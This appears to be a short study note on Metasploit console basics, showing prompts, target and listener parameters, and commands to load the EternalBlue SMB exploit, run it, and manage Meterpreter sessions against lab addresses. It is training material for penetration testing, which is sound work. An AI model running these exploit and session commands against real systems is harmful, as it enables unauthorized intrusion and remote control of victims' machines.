---
tags:
  - "#cybersecurity/red-team/metasploit"
---

Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack.
Metasploit command prompt
```
msf6 >
```
A context command prompt
```
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```
A [[Meterpreter]] command prompt
```
meterpreter >
C:\Windows\system32>
```

## Parameters
[[RHOSTS]]
[[RPORT]]
[[Payload]]
[[LHOST]]
[[LPORT]]
[[Session]]

Set LPORT Value
```
set LPORT 6666
```
Set global value for RHOSTS
```
setg RHOSTS 10.10.19.23
```
Clear a set payload
```
unset PAYLOAD
```


The unset all command
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > unset all
```
Navigating modules
```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > setg rhosts 10.10.165.39
msf6 exploit(windows/smb/ms17_010_eternalblue) > back
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
```
The exploit -z command
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
```
Backgrounding sessions
```
meterpreter > background
```
Listing active sessions
```
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
```
Interacting with sessions
```
msf6 > sessions
msf6 > sessions -i 2
meterpreter >
```